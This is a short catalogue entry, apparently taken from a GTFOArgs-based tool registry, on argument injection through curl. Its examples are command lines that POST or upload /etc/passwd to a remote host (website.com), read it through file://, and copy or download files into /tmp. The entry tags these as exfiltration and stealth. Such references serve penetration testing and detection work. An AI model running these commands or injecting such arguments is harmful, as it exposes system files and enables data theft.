---
trust_level: community
id: argument-injection-curl
namespace: argument:injection:curl
name: curl
description: Argument injection via curl
version: 1.0.0
capabilities:
- network.transfer.upload
- system.file.read
- network.transfer.download
- system.file.write
platforms:
- cross-platform
techniques:
- exfiltration
- discovery
execution:
  template: curl
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Send a local file to a remote server in a POST request.
  command: 'curl --data @/etc/passwd http://website.com/ '
- description: Send a local file to a remote server in a POST request.
  command: 'curl -F ''var=@/etc/passwd'' http://website.com/ '
- description: Send a local file to a remote server in a POST request.
  command: 'curl --upload-file /etc/passwd http://website.com/ '
- description: Read local files by using the file:// schema.
  command: 'curl file:///etc/passwd '
- description: Downloads a file to a destination.
  command: 'curl http://website.com/ -o /tmp/ '
- description: Uses file-read to effectively copy files.
  command: 'curl file:///etc/passwd -o /tmp/ '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/curl/
features:
- file-system
- local
- network-intensive
- stealth
---

# curl

GTFOArgs entry for curl. This binary can be used to inject arguments for execution, file operations, or other capabilities.
